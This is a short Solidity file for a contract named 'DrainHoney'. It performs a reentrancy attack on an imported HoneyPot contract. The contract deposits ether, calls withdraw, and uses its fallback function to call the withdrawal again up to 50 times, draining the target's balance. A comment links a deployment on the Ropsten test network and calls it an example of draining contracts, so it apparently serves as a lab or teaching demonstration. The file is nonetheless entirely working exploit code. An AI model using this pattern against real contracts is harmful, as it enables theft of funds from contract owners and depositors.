pragma solidity ^0.4.13;

// Refer to deployed contract at https://ropsten.etherscan.io/address/0x935212B4d15cbF496FdDbFD63821ad4e04d0777d
// Another example of draining contracts

import './HoneyPot.sol';

contract DrainHoney {

  HoneyPot hp;
  uint loop;

  function DrainHoney(address _contract) {
    hp = HoneyPot(_contract);
  }
  // send 0.1 first
  function sendMoney() {
    hp.put.call.value(msg.value)();
  }
  // call get next
  function get() {
    hp.get();
  }

  function() payable {
     if (loop < 50) {
       loop++;
       hp.get();
     }
  }
}
